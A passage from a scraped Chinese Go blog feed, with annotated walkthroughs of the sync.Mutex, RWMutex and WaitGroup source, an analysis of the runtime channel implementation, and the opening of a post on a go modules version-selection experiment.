mutexStarving &#125; // 如果当前协程设置过 mutexWoken 或当前协程是被 Unlock 唤醒的，那么 awoke 取值为 true， // 此时这个协程需要取消设置 mutexWoken，否则就不会有协程被 Unlock 唤醒了 if awoke &#123; if new&amp;mutexWoken == 0 &#123; throw(\"sync: inconsistent mutex state\") &#125; new &amp;^= mutexWoken &#125; // 尝试用 CAS 更新 state if atomic.CompareAndSwapInt32(&amp;m.state, old, new) &#123; // 如果 old 既不是饥饿模式也没有上锁，那么 new 一定是设置了 mutexLocked 的， // 而能够执行到这里就说明 CAS 成功了，也就是说当前协程获取到了锁，直接返回即可 if old&amp;(mutexLocked|mutexStarving) == 0 &#123; break &#125; // 如果 waitStartTime 不为 0，那么说明当前协程此前阻塞过，此时要将当前协程放在阻塞队列的队首， // 这样下次会优先唤醒当前协程，避免饥饿现象 queueLifo := waitStartTime != 0 // 如果 waitStartTime 为 0，说明当前协程还未阻塞过， // 此时向该变量写入当前时间用于区分那些未阻塞过的协程 if waitStartTime == 0 &#123; waitStartTime = runtime_nanotime() &#125; // 通过信号量将当前协程阻塞 runtime_SemacquireMutex(&amp;m.sema, queueLifo, 1) // 能执行到这里，说明当前协程被唤醒了，此时判断当前协程的阻塞时间是否已经大于 starvationThresholdNs， // 如果为 true，那么将 starving 置为 true，此后这个协程会将 Mutex 切换为饥饿模式 starving = starving || runtime_nanotime()-waitStartTime &gt; starvationThresholdNs old = m.state // 如果当前 Mutex 已经是饥饿模式了，那么其他协程不会尝试获取锁，当前协程的优先级更高 if old&amp;mutexStarving != 0 &#123; if old&amp;(mutexLocked|mutexWoken) != 0 || old&gt;&gt;mutexWaiterShift == 0 &#123; throw(\"sync: inconsistent mutex state\") &#125; // 从后面的 unlockSlow 可以看到，饥饿模式下唤醒协程后不会减少 waiter 的数量， // 所以当前协程需要自己来设置这个新的值 delta := int32(mutexLocked - 1&lt;&lt;mutexWaiterShift) // 如果当前协程的阻塞时长还没达到 starvationThresholdNs，或当前协程是最后一个 waiter， // 那么取消 Mutex 的饥饿模式，因为饥饿模式太低效了，新的协程根本没有机会获得锁 if !starving || old&gt;&gt;mutexWaiterShift == 1 &#123; delta -= mutexStarving &#125; // 一旦进入饥饿模式，新的协程都只会增加 waiter，而不会操作 delta 中依赖的部分， // 所以这里可以放心地用 AddInt32 而不需要用 CAS atomic.AddInt32(&amp;m.state, delta) break &#125; awoke = true iter = 0 &#125; else &#123; // 如果失败，取 state 的最新值，重新执行 for 循环， // 因为没有重置 iter，所以当前协程不会再进行自旋 old = m.state &#125; &#125;&#125; 2.4. 解锁过程解锁过程同加锁过程一样，也是由 Unlock 和 unlockSlow 来配合实现的，但解锁相较于加锁要简单很多： 1234567891011121314151617181920212223242526272829303132333435363738394041func (m *Mutex) Unlock() &#123; // 对一个未加锁的 Mutex 调用 Unlock 属于运行时错误，unlockSlow 会直接 panic， // 所以这里就先放心地通过 AddInt32 去掉 mutexLocked new := atomic.AddInt32(&amp;m.state, -mutexLocked) // 如果不为 0，那么说明当前 Mutex 有 waiter，此时需要进入 unlockSlow， // 否则 Unlock 就算结束了，Mutex 经过这个操作后会回归初态 if new != 0 &#123; m.unlockSlow(new) &#125;&#125;func (m *Mutex) unlockSlow(new int32) &#123; // 如上所述，如果这个条件成立，那么说明使用者对一个未加锁的 Mutex 调用了 Unlock， // 这是不被允许的，所以会直接 panic if (new+mutexLocked)&amp;mutexLocked == 0 &#123; throw(\"sync: unlock of unlocked mutex\") &#125; // 如果当前未处于饥饿模式 if new&amp;mutexStarving == 0 &#123; old := new for &#123; // 如果当前已经没有 waiter，或者 Mutex 又被上了锁， // 或者新来的协程设置了 mutexWoken 标记， // 或者其他协程将当前 Mutex 设置为饥饿模式， // Unlock 都不该唤醒新的协程，此时直接返回即可 if old&gt;&gt;mutexWaiterShift == 0 || old&amp;(mutexLocked|mutexWoken|mutexStarving) != 0 &#123; return &#125; // 否则唤醒一个协程，让这个协程参与到锁竞争中去 new = (old - 1&lt;&lt;mutexWaiterShift) | mutexWoken if atomic.CompareAndSwapInt32(&amp;m.state, old, new) &#123; runtime_Semrelease(&amp;m.sema, false, 1) return &#125; old = m.state &#125; &#125; else &#123; // 饥饿模式下直接唤醒一个协程，waiter 的修改交给协程自己来做 runtime_Semrelease(&amp;m.sema, true, 1) &#125;&#125; 3. RWMutex3.1. 基本原理和 Mutex 不同，RWMutex 将加锁解锁这一操作细分成读锁和写锁，在使用效果上，同一时间可以有多个协程持有读锁，但仅会有一个协程持有写锁。但正是由于这一点，所以读锁相对写锁而言更容易获取，因为两次读锁之间不会有锁冲突，这很可能导致试图加写锁的协程饥饿，也就是长时间获取不到写锁。 为了避免这种现象，RWMutex 会保证当一个协程尝试获取写锁后，尽管它可能会失败，但在其之后尝试获取读锁的协程都没办法成功获取到锁，直至已经持有读锁的协程释放了锁，前面尝试获取写锁的协程拿到并释放锁后，这些新来的协程才能继续获取读锁。 3.2. 核心数据结构RWMutex 的核心数据结构也很简单，并且同 Mutex 一样，一个零值的结构体就是一个初态的读写锁，结构体的具体字段如下： 1234567type RWMutex struct &#123; w Mutex // 用于做写锁之间的排他锁，保证在 RWMutex.Unlock 执行之前，RWMutex.Lock 方法只能被执行一次 writerSem uint32 // 写锁的 waiter 使用的信号量，写锁 acquire，读锁 release readerSem uint32 // 读锁的 waiter 使用的信号量，读锁 acquire，写锁 release readerCount int32 // 当前有多少协程获取了读锁，这个字段还有一些其他的用途，我们下面会看到 readerWait int32 // 在某个协程尝试加写锁时，有多少协程已经获取到了读锁，如果这个值不为 0，那么这个获取写锁的协程需要阻塞直到这些协程均释放了持有的读锁&#125; 除了这个结构体外，还有一个很重要的常量定义 const rwmutexMaxReaders = 1 &lt;&lt; 30，这个东西是用来与 readerCount 字段配合使用的，具体而言，我们前面提到当一个协程尝试获取写锁但失败时，它会陷入阻塞，但在它之后的所有尝试获取读锁的协程都会阻塞。为了达成这个效果，我们就需要在尝试获取写锁时，在 RWMutex 加一个标记表示有协程在尝试获取写锁，这个标记在实现上是通过 readerCount 与 rwmutexMaxReaders 来相互配合的。当协程尝试加写锁时，会将 readerCount 减掉 rwmutexMaxReaders，这会导致 readerCount 变成一个很小的负数，这样在协程尝试加读锁时，一旦检测到这个值是负数，那么它就知道现在有协程在尝试获取写锁，此时它就应该乖乖地降低自己的优先级。 3.3. 写锁加锁过程1234567891011121314151617181920func (rw *RWMutex) Lock() &#123; // 先将 w 加锁，直到 rw.Unlock 被调用时才会调用 rw.w.Unlock， // 保证在这期间只有一个协程能够拿到写锁 rw.w.Lock() // 这里原子性地做了两件事情，首先通过 AddInt32 将 readerCount 减掉 rwmutexMaxReaders， // 这样做会通知其他协程“当前有协程在尝试获取写锁”，此后尝试获取读锁的协程都应该阻塞， // 另外，AddInt32 会返回 readerCount 的新值，将这个值增加 rwmutexMaxReaders， // 就可以拿到 AddInt32 之前的值 r := atomic.AddInt32(&amp;rw.readerCount, -rwmutexMaxReaders) + rwmutexMaxReaders // 如果此前 readerCount 不为 0，那么它一定大于 0，因为 rw.RLock 会增加这个值， // 而 rw.RUnlock 会减少这个值，所以大于 0 时代表当前还有协程没有释放读锁， // 这时应该将这个值增加到 readerWait 上，然后将当前协程阻塞， // rw.RUnlock 会减少 readerWait，减为 0 时会释放信号量来唤醒协程， // 此后 rw.Lock 返回，RWMutex 成功加写锁 if r != 0 &amp;&amp; atomic.AddInt32(&amp;rw.readerWait, r) != 0 &#123; runtime_SemacquireMutex(&amp;rw.writerSem, false, 0) &#125;&#125; 3.4. 写锁解锁过程123456789101112131415161718192021222324func (rw *RWMutex) Unlock() &#123; // 将 readerCount 变回正数，通知其他 reader 当前没有 writer 在等着获取锁， // 这样当新的 reader 想获取读锁时，不需要陷入阻塞 r := atomic.AddInt32(&amp;rw.readerCount, rwmutexMaxReaders) // 如果 r 的值大于等于 rwmutexMaxReaders，那么说明对一个没有上写锁的 RWMutex // 调用了 Unlock，这是不正确的运行时错误，所以要 panic if r &gt;= rwmutexMaxReaders &#123; throw(\"sync: Unlock of unlocked RWMutex\") &#125; // r 如果大于 0 那一定是在调用 Lock 之后调用的 RLock 导致的， // 因为在这之前的 RLock 优先级都比 Lock 高，而既然现在在执行 Unlock， // 那么说明 Lock 也已经成功执行了， // 进而说明 Lock 前面的 RLock 对应的 RUnlock 也都执行完了， // 对于这些后执行的 RLock 来说，由于其优先级比 Lock 低， // 所以都会因为 acquire readerSem 而导致阻塞，在 Unlock 时要进行 release for i := 0; i &lt; int(r); i++ &#123; runtime_Semrelease(&amp;rw.readerSem, false, 0) &#125; // 释放 w，运行其他协程尝试获取写锁 rw.w.Unlock()&#125; 3.5. 读锁加锁过程12345678func (rw *RWMutex) RLock() &#123; // 加读锁仅仅是原子增加 readerCount 的值，如果增加后的结果小于 0， // 那么说明在此之前有一个 writer 在尝试获取写锁，不论它是否成功获取到， // 当前的协程都应该阻塞 if atomic.AddInt32(&amp;rw.readerCount, 1) &lt; 0 &#123; runtime_SemacquireMutex(&amp;rw.readerSem, false, 0) &#125;&#125; 3.6. 读锁解锁过程1234567891011121314151617181920212223242526func (rw *RWMutex) RUnlock() &#123; // RUnlock 的核心操作是减少 readerCount，如果减少后的结果小于 0， // 那么说明当前的协程在一个 writer 之前获取到了读锁， // 而这个 writer 正在等待当前的协程， // 也就是说 rw.readerWait 中的其中一个就是当前协程，此时需要特殊处理 if r := atomic.AddInt32(&amp;rw.readerCount, -1); r &lt; 0 &#123; rw.rUnlockSlow(r) &#125;&#125;func (rw *RWMutex) rUnlockSlow(r int32) &#123; // 如果 r+1==0，说明 readerCount 在减少之前是 0， // 但 RLock 方法一定会增加 readerCount，所以这就代表使用者在对未加锁的 RWMutex 解锁； // 另外，r 也不可能小于 -rwmutexMaxReaders，因为 rw.Lock 方法通过 rw.w 保证其在 rw.Unlock 之前只会被一个协程调用， // 所以如果出现这种情况也同样是有问题的，此时直接 panic if r+1 == 0 || r+1 == -rwmutexMaxReaders &#123; throw(\"sync: RUnlock of unlocked RWMutex\") &#125; // 如前所述，如果能进到 rUnlockSlow 中，说明当前协程是 rw.readerWait 的一份子， // 所以在当前协程释放读锁后应该减少 rw.readerWait，而一旦这个值为 0， // 就说明 writer 之前的所有协程都释放了读锁，此时应该通过信号量来唤醒这个 writer if atomic.AddInt32(&amp;rw.readerWait, -1) == 0 &#123; runtime_Semrelease(&amp;rw.writerSem, false, 1) &#125;&#125; 4. WaitGroup4.1. 基本原理WaitGroup 适合某个/些协程“等待”另一个/些协程的场景，比如一个主协程分出 n 个子协程去调不同的 rpc，然后 Wait 这些协程直到它们全部返回，再收集这些调用结果；亦或是一个主协程去做一些事，多个子协程在 Wait 它把这件事做完。总而言之，Add/Done 被那些“做某件事”的协程调用，Wait 则被那个“等待结果”的协程调用。 但 Add 方法并不限制传入的值一定是 1，所以 WaitGroup 的使用方式非常灵活。这就要求我们需要记录当前某个 WaitGroup Add 了多少，相应的需要调用同样多次 Done 才能让调用 Wait 的协程被唤醒。而调用 Wait 的协程又可能不止一个，所以我们还需要记录这个数量，在 Done 的调用次数达标时，这些协程都应该被唤醒。 4.2. 核心数据结构WaitGroup 的核心数据结构虽然定义很简单，但理解起来却有一定难度，和前两个结构体一样，一个零值的结构体就是一个初态的 WaitGroup，这个结构体的定义如下： 1234type WaitGroup struct &#123; noCopy noCopy state1 [3]uint32&#125; 首先是 noCopy 这个结构，顾名思义，它用于检查 WaitGroup 被创建后是否被复制，一旦某个 WaitGroup 被复制，go vet 工具就可以将这个复制操作检查出来。 然后是 state1 这个结构，它最终是通过 WaitGroup.state 这个方法来使用的，这个方法的定义是这样的： 123456789101112func (wg *WaitGroup) state() (statep *uint64, semap *uint32) &#123; // 如果 state1 的起始地址是 64 位对齐的 if uintptr(unsafe.Pointer(&amp;wg.state1))%8 == 0 &#123; // 那么用 state1 前两个位置作为一个 uint64，最后一个位置作为一个 uint32 return (*uint64)(unsafe.Pointer(&amp;wg.state1)), &amp;wg.state1[2] &#125; else &#123; // 否则用 state1 的后两个位置作为一个 uint64， // 此时这个 uint64 的起始地址是 64 位对齐的， // 然后用第一个位置作为一个 uint32 return (*uint64)(unsafe.Pointer(&amp;wg.state1[1])), &amp;wg.state1[0] &#125;&#125; 可以看到，state1 最终会通过 state 方法拆解出 state 和 sema 两个值，前者用于记录 WaitGroup 的状态，后者作为信号量来实现协程的阻塞与唤醒。和 Mutex 不同，这里的 state 需要是 64 位的，因为它前 32 位记录 Add 的总量，后 32 位记录 Wait 的协程数量，如果仍然使用 32 位的 state，那么这两个内容的最大值都会很受限。 而一旦 state 是 64 位的，那我们就需要通过 64 位的原子操作来操作这个字段，但 64 位的原子操作要求被操作数的地址是 64 位对齐的，也就是首地址模 8 需要为 0。64 位系统的编译器会保证这一点，但 32 位系统的编译器却只保证操作数地址是 32 位对齐的，也就是说可能出现操作数首地址模 8 后等于 4 的情况。所以为了在这样的情况下仍然能够原子性地操作 uint64，就需要手动进行内存对齐，也就是跳过 state1 的前 32 位。 4.3. Add/Done 过程WaitGroup.Done 实际上就是 WaitGroup.Add(-1)，所以我们这里仅给出 Add 方法的代码解读： 123456789101112131415161718192021222324252627282930313233343536func (wg *WaitGroup) Add(delta int) &#123; statep, semap := wg.state() // 将 Add 的入参增加到 state 的高 32 位，delta 可正可负 state := atomic.AddUint64(statep, uint64(delta)&lt;&lt;32) // 获取增加后的 Add 总量 v := int32(state &gt;&gt; 32) // 从 state 的低 32 位获取当前调用了 Wait 的协程数量 w := uint32(state) // Add 总量不能小于 0，否则 Done 就永远无法结束了 if v &lt; 0 &#123; panic(\"sync: negative WaitGroup counter\") &#125; // 如果 delta 大于 0 且当前 Add 的总量就是 delta，那么说明是第一次调用 Add，此时 waiter 应该为 0， // 否则说明 Wait 和 Add 同时被调用了，这属于运行时错误，所以需要 panic if w != 0 &amp;&amp; delta &gt; 0 &amp;&amp; v == int32(delta) &#123; panic(\"sync: WaitGroup misuse: Add called concurrently with Wait\") &#125; // 如果 Add 总量仍大于 0，或根本就没有 waiter，那么此时不需要唤醒 waiter，直接退出就好 if v &gt; 0 || w == 0 &#123; return &#125; // 否则 v 一定等于 0 且 waiter 不为 0，那么此时 Done 的数量已经达标，需要唤醒所有的 waiter // 如果这两个值不相等，说明在当前 Add 执行期间其他协程调用了 Add 或 Wait，此时算作运行时错误 if *statep != state &#123; panic(\"sync: WaitGroup misuse: Add called concurrently with Wait\") &#125; // 重置 state，并将所有的 waiter 都唤醒 *statep = 0 for ; w != 0; w-- &#123; runtime_Semrelease(semap, false, 0) &#125;&#125; 4.4. Wait 过程1234567891011121314151617181920212223242526func (wg *WaitGroup) Wait() &#123; statep, semap := wg.state() for &#123; // 获取 Add 的总量和 waiter 的数量 state := atomic.LoadUint64(statep) v := int32(state &gt;&gt; 32) w := uint32(state) // 如果 Add 的总量已经为 0，那么说明 Done 的数量已经达标，此时 Wait 直接返回 if v == 0 &#123; return &#125; // 否则说明 Done 还未达标，需要原子增加 waiter 的数量，并将当前协程阻塞 if atomic.CompareAndSwapUint64(statep, state, state+1) &#123; runtime_Semacquire(semap) // 由于在 release semap 前已经将 state 置为 0，所以执行到这里时也应该是 0， // 如果不为 0，那么说明 state 在所有 waiter 被唤醒前就被复用了，此时算作运行时错误 if *statep != 0 &#123; panic(\"sync: WaitGroup is reused before previous Wait has returned\") &#125; return &#125; &#125;&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"/categories/Golang/"}],"tags":[]},{"title":"浅析 golang channel 源码","slug":"golang-channel-src","date":"2023-06-11T03:07:49.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2023/06/11/golang-channel-src/","link":"","permalink":"/2023/06/11/golang-channel-src/","excerpt":"","text":"前言channel 是 golang 内置的用于协程间数据同步的工具，是 make 这个函数能创建的三种结构之一，具体语法有 make(chan type) 和 make(chan type, size) 两种。这两种方式的差异在于前者是无缓冲 channel，也就是说如果当前没有接受者，那么在发送者尝试向其中写入内容时会阻塞；后者的 size 则用于描述缓冲区的大小，在同样的场景下，前 size 次写入不会阻塞发送者。 另一方面，channel 可以和 golang 的 select 语句进行配合，从而实现一个协程监听多个 channel 的功能，而如果在 select 中设置了非阻塞的 default，那么不论在创建 channel 时是否设置了缓冲区，对其的读写都是非阻塞的。 本文从源码的角度来分析 channel 的实现，具体来说包括创建、写入、读取与关闭，在分析源码时只关注 channel 本身的主流程，所以会略过诸如静态检查、防重排序等内容。源码文件是 runtime/chan.go，这里包含了 golang 语法糖背后的秘密。 基础结构在 chan.go 文件中，被定义的 channel 相关结构有两个，具体如下： 1234567891011121314151617181920212223type hchan struct &#123; lock mutex // 保障 channel 的并发安全 closed uint32 // 当前 channel 是否已经关闭 // 因读写当前 channel 而阻塞的协程列表 recvq waitq // 因读而阻塞 sendq waitq // 因写而阻塞 // 下面字段与缓冲区相关 qcount uint // 当前缓冲区中的元素数量，可以通过 len 函数获得 dataqsiz uint // 缓冲区能够容纳的元素数量，可以通过 cap 函数获得，一经创建不可修改 buf unsafe.Pointer // 缓冲区对应内存的首地址 sendx uint // 缓冲区中的写入指针 recvx uint // 缓冲区中的读取指针 elemsize uint16 // 缓冲区中单个元素的大小，实际上是 elemtype.size 的值 elemtype *_type // 缓冲区中的元素类型&#125;type waitq struct &#123; first *sudog last *sudog&#125; 当我们在代码中通过 make 来创建一个 channel 时，实际拿到的结构是 hchan 的指针，这个结构中记录了 channel 本身的元信息，比如缓冲区大小、缓冲区内存首地址、channel 中元素的类型等。channel 的各种操作都依赖于这些信息，而 channel 本身又是并发安全的，所以有 lock 这个锁结构来保证这一点。 另一方面，创建 channel 时可能会被要求创建数据的缓冲区，这块缓冲区被实现成循环队列，是一块以 hchan.buf 为首的、hchan.dataqsize * hchan.elemtype.size 大小的连续内存，读写指针被保存在 hchan.recvx 和 hchan.sendx 中。 最后，在阻塞地读写 channel 时都可能会因为不满足读写条件而导致当前协程被挂起，挂起时需要保存与协程相关的 channel 上下文，比如在尝试读写哪个 channel，数据的源地址和目标地址等，这些内容被定义在 runtime.sudog 结构中。而同一个 channel 在同一时间有可能导致多个协程的阻塞，比如多个发送者同时向一个满 channel 中写入数据，那么它们就都会阻塞，这就需要 channel 能以列表的形式保存所有因它而阻塞的协程，对应到代码中就是 hchan.recvq 和 hchan.sendq 这两个字段，前者保存因读而阻塞的协程列表，后者保存因写而阻塞的协程列表，两者都是 waitq 类型，这是一个双向链表。 创建channel 的创建最终会由 runtime.makechan 这个函数来完成，如前所述，这个函数的最终目的是按使用者的需求在堆上创建一个对应的 hchan 结构，然后将这个结构的指针返回，所以整体流程并不复杂。 makechan 在创建 hchan 结构时，根据入参的不同有三种分配方式： 123456789101112var c *hchanswitch &#123;case mem == 0: // 不需要缓冲区 c = (*hchan)(mallocgc(hchanSize, nil, true)) c.buf = c.raceaddr()case elem.ptrdata == 0: // 缓冲区中的数据类型是非指针类型 c = (*hchan)(mallocgc(hchanSize+mem, nil, true)) c.buf = add(unsafe.Pointer(c), hchanSize)default: // 需要缓冲区，且缓冲区中的数据类型是指针类型 c = new(hchan) // 对应 runtime.newobject，等价于 mallocgc(hchanSize, typeOf(hchan), true) c.buf = mallocgc(mem, elem, true)&#125; 如果 size 为 0，也就是当前的 channel 不需要缓冲区，那么直接分配一个 hchan 大小的内存即可，这块内存只用于承载 hchan 中的数据 如果 channel 中保存的数据类型不是指针类型，那么分配一块大内存，前半部分保存 hchan，后半部分用来作为缓冲区，同时把后半部分的首地址放在 hchan.buf 字段中 如果 channel 中保存的数据类型是指针类型，那么分配两块内存，分别用来保存 hchan 和缓冲区 我没有研究过 golang 的内存分配模型，但从代码上看可以发现前两个分支都不涉及“指针类型数据的缓冲区”，在调用 mallocgc 时第二个参数传递了 nil，而拥有指针类型数据的缓冲区的 channel 则用数据类型作为 mallocgc 的第二个参数（new 这个内置函数对应 runtime.newobject 函数，本质也是调用了 mallocgc），猜测第二参数可以辅助决定是否需要 gc 来扫描这块内存。 写入channel 的写入最终由 runtime.chansend 这个函数来完成，这个函数整体比较长，但 channel 本身相关的内容并不多。chansend 的函数签名被定义成 func chansend(c *hchan, ep unsafe.Pointer, block bool, callerpc uintptr) bool，第一个参数是发送数据的目标 channel，第二个参数是被发送数据的源地址，第三个参数代表本次写入是否阻塞（如果配合了 select-default 那么就是非阻塞的），第四个参数与主流程无关，可以忽略，返回值是一个 bool 类型，代表这次写入是否成功，这个返回值是给 select 的分支选择来用的。 下面来分析代码，chansend 首先判断了目标 channel 是否为 nil，如果在 select-default 中向 nil 中发送数据，那么直接返回 false 跳过对应的 case 分支，而如果是在阻塞流程中发送数据，那么当前协程将会永远阻塞： 1234567if c == nil &#123; if !block &#123; return false &#125; gopark(nil, nil, waitReasonChanSendNilChan, traceEvGoStop, 2) throw(\"unreachable\")&#125; 在确保 c 不是 nil 后，我们就可以认为这次的发送是一个合理的调用，那么通常来说我们就应该对这个 channel 加锁，然后进行内部字段的变动。但 golang 为了加速 select 环境下写入时的分支判断，在加锁前首先判断了一下当前 channel 是否已满，如果满了就提前返回 false 避免锁开销，对应的语句是 if !block &amp;&amp; c.closed == 0 &amp;&amp; full(c) {return false}。在这其中，full 函数的实现是这样的： 12345678func full(c *hchan) bool &#123; if c.dataqsiz == 0 &#123; // 如果当前 channel 没有缓冲区，那么判断当前是否有等待读取数据的协程，没有则说明本次写入会导致当前协程阻塞 return c.recvq.first == nil &#125; // 如果有缓冲区，那么判断缓冲区是否已满，满则说明本次写入会导致当前协程阻塞 return c.qcount == c.dataqsiz&#125; 如果浅试一下后发现可以写入，那么此时才对当前 channel 进行加锁，加锁后做的第一件事情就是判断当前 channel 是否关闭，因为尽管加锁前判断过 channel 未关闭，但这仍不能确定当前协程获取到锁以后 channel 的状态是什么样的。如果一个协程向关闭的 channel 中写入数据，那么程序会 panic。 然后，chansend 会尝试从 hchan.recvq 中获取一个协程，如果能获取到，那么说明有协程在等待从当前 channel 中读取数据，此时调用 runtime.send 将数据发给对应的协程。我们前面提到 hchan.waitq 中保存的是 runtime.sudog 的双向链表，而后者中保存了与当前 channel 相关的上下文，在发送数据的这个场景下，sudog.elem 保存了读取到的内容应该保存在哪里，比如 val &lt;- c 这个语句下，val 的地址就会被保存在 sudog.elem 中，而这里所谓的“发送”，其实就是将 chansend 入参中的 ep 这个指针内保存的数据复制到 sudog.elem 对应的内存里。此外，由于此时这个准备接收数据的协程已经拿到了它需要的内容，发送方还要调用 runtime.goready 来将对应协程加入到协程的调度队列中，这样对应的协程才有机会被运行到。 通过与我们后面描述的读取过程相配合，我们在写入时可以假设如果从 hchan.recvq 中获取到了协程，那么当前的 channel 缓冲区中一定是没有数据的。反过来说，如果没能获取到协程，那么在 hchan.lock 的保护下，我们可以放心地向缓冲区中写入数据。在写入时需要先通过比较 hchan.qcount 和 hchan.dataqsiz 的大小来判断缓冲区是否已满，未满时直接将数据拷贝到缓冲区就完成了这次的写入过程。 另一方面，如果缓冲区已满，或者这个 channel 本身没有缓冲区时，就意味着当前的协程应该阻塞直至这个 channel 可以被写入。这里的阻塞本质上就是把当前协程挂在其等待的 channel 上，并让 golang 的调度器不能访问到它，当 channel 可以被写入时，由其他的协程来唤醒当前协程。我们前面看到因为读取而阻塞的协程可能会被执行写入的协程唤醒，那么反过来，因写入而阻塞的协程就是被执行读取的协程唤醒的。 但是在陷入阻塞之前，还需要先判断一下入参的 block 是否为 true，并按需提前结束当前函数，从而实现非阻塞写入。协程在执行 gopark 函数时会陷入阻塞，当被唤醒时会继续执行 gopark 之后的内容，通过继续阅读源码我们会发现，协程只是做了一些收尾判断工作，尽管在陷入阻塞前 sudog.elem 中会被写入待发送数据的地址，但陷入阻塞的协程在被唤醒后并没有继续使用这个参数来做什么，我们从读取 channel 部分的代码可以看到，因为这个参数已经被负责从 channel 中读取数据的协程用掉了。 读取channel 的读取最终由 chanrecv 这个函数来完成，入参的含义与写入时相同，所不同的是返回值有两个，第一个与写入时一样代表当本次操作是某个 select 语句中的一个 case 时，经历内部的一系列判断后是否被外面的 select 语句选择到，后者则代表本次读取是否成功读到了值。 读取的过程整体上与写入是类似的，首先对于 nil 的读取在非阻塞读取时会直接返回，阻塞读取时会导致永远阻塞。然后在经历 fast-path 判断后，当确实要对 channel 进行写入时会通过 hchan.lock 来保证并发安全。读取操作首先会从 hchan.sendq 中尝试获取一个协程，如果能获取到，那么就说明当前 channel 一定是空。此时调用 recv 函数来完成具体的传递逻辑。 123456789101112131415161718192021222324252627if c.dataqsiz == 0 &#123; // 无缓冲 channel，应该将“因写入而阻塞的协程”携带的数据（sudog.elem）作为目标数据 if raceenabled &#123; racesync(c, sg) &#125; if ep != nil &#123; // ep 是读取到的数据应该写入的地址 recvDirect(c.elemtype, sg, ep) &#125;&#125; else &#123; // 如果 channel 有缓冲但仍执行到了这里，也就是当前有“因写入而阻塞的协程”，那么说明缓冲区一定满了， // 此时应该从缓冲区头部取出数据作为目标数据，并把“因写入而阻塞的协程”携带的数据放进缓冲区， // 这样就可以保障 channel FIFO 的特性 qp := chanbuf(c, c.recvx) ... // 这里按理说不应该出现 ep == nil 的情况，这里可能是为了 double check if ep != nil &#123; typedmemmove(c.elemtype, ep, qp) &#125; // 把“因写入而阻塞的协程”携带的数据放进缓冲区 typedmemmove(c.elemtype, qp, sg.elem) c.recvx++ if c.recvx == c.dataqsiz &#123; c.recvx = 0 &#125; c.sendx = c.recvx // c.sendx = (c.sendx+1) % c.dataqsiz&#125; 从上面的代码也可以发现，不论最终流程走到了 if 还是 else，从 hchan.sendq 中获取到的协程所携带的数据都被转移走了，所以正如我们前面在讨论写入流程时提到过的，hchan.sendq 中的协程被唤醒后不需要再对 sudog.elem 做什么处理。 另一方面，如果没能从 hchan.sendq 中获取到协程，那么就需要尝试从缓冲区中获取数据，具体而言是判断 hchan.qcount 是否大于 0，如果这个条件成立那么说明缓冲区中存在数据，此时将内容拷贝出来并按需调整缓冲区的相关字段，然后就可以结束读取的过程了。 但如果缓冲区也没有数据，那就代表当前协程没办法从 channel 中获取数据，它首先应该释放 hchan.lock 来给其他协程提供写入的机会，另一方面，根据 block 入参的取值，还需要分情况处理。如果这个值为 false，那么当前读取流程就应该直接退出，反过来说如果为 true，那么将当前协程阻塞。与写入过程相同，在当前协程下次被唤醒后也不需要对 hchan.elem 做什么处理，因为它是给写入过程用的，这部分内容我们在上文也已经讨论过了，这里就不再赘述。 关闭channel 的关闭通过 closechan 函数来实现，这个函数首先对 channel 本身做了一些判断，如果 channel 为 nil 或已经关闭过了（hchan.closed 不为 0），那么会直接 panic。在这之后，它会从 hchan.recvq 和 hchan.sendq 中获取所有阻塞中的协程，然后依次唤醒它们。 虽然代码中同时处理了这两个双向链表，但实际上对于一个 channel 而言，不会出现两个链表都不为空的情况。因为 closechan 在遍历这两个链表和唤醒它们时会先对 hchan.lock 加锁，所以在它执行这些逻辑的过程中 channel 的状态不会再发生变化。如果 hchan.recvq 上有内容，那么说明此时 channel 的缓冲区中一定没有数据，或者根本没有缓冲区，此时协程被唤醒时 sudog.elem 对应的地址中并没有被写入内容，所以使用方会拿到对应类型的零值；而如果 hchan.sendq 上有内容，那么当这些协程被唤醒时是想向关闭的 channel 中写入数据的，此时会导致 panic。 关闭 channel 后缓冲区中仍然可能有内容，因为 closechan 并没有处理缓冲区中的内容。所以此时如果有协程想从其中读取内容，那么这仍然是有效的，chanrecv 会从缓冲区中正常的拿到所需的数据。","categories":[{"name":"Golang","slug":"Golang","permalink":"/categories/Golang/"}],"tags":[]},{"title":"关于 go modules 的一个小实验","slug":"go-modules-lib","date":"2023-05-13T15:17:15.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2023/05/13/go-modules-lib/","link":"","permalink":"/2023/05/13/go-modules-lib/","excerpt":"","text":"问题最近在做项目时和同事聊到这样一个问题，假设有 a、b、c 三个库，它们之间的依赖关系如下： 12a -&gt; ca -&gt; b -&gt; c 也就是说，如果把整个依赖关系看作一棵以 a 为根节点的树，那么它有两条路径可以走到 c。 此时的问题是，如果 a 依赖的 c 与 b 依赖的 c 版本相同，整个项目中存在几个 c？如果 c 的版本不同，整个项目中存在几个 c？ 结论先说结论，go modules 在决策外部依赖的版本时会使用最小版本选择（Minimal Version Selection）算法，这个算法最终保证项目会使用最合适的最低版本的外部依赖，其中版本使用语义化版本（SemVer）。对于本文想要探究的问题而言，答案是当主版本号未变化时最终整个项目只会存在一个 c，主版本号发生变化时会存在多个 c。 实验过程 以下实验使用 1.18 版本的 golang 为了验证这个问题，我们创建如下三个库：testlib1、testlib2、testlib3，分别对应前文所述的 c、b、a。 准备 testlib1（也就是前文的 c）在 testlib1 中，我们写入如下的代码： 1234567891011121314151617package testlib1import \"fmt\"var globalMap map[string]string = make(map[string]string)const prefix = \"testlib1@v0.0.1 \"func Register(k, v string) &#123; fmt.Println(prefix + \"Register\") globalMap[k] = v&#125;func GetAll() &#123; fmt.Println(prefix + \"GetAll\") fmt.Println(globalMap)&#125; 这段代码的逻辑很简单，我们创建了一个全局的 map，并提供一个 Register 方法向 map 中写入内容，提供一个 GetAll 方法输出全局 map 中的内容。此外为了观察版本，我们在 Register 与 GetAll 中输出当前的版本。 将这段代码进行 commit，并打上 0.0.1 的 tag。然后分别将 prefix 常量中的版本号改为 0.0.2，0.2.1，2.0.1，并创建对应的 commit 与 tag，做完这些操作，我们将拥有一个包含了 4 次 commit 的 testlib1。为了能够使用这个库，可以将它发布到 github 上。 此时 testlib1 的状态如下： 1234testlib1@v0.0.1 --依赖--&gt; 无testlib1@v0.0.2 --依赖--&gt; 无testlib1@v0.2.1 --依赖--&gt; 无testlib1@v2.0.1 --依赖--&gt; 无 准备 testlib2（也就是前文的 b）在 testlib2 中，首先通过 go get github.com/wqvoon/testlib1@v0.0.1 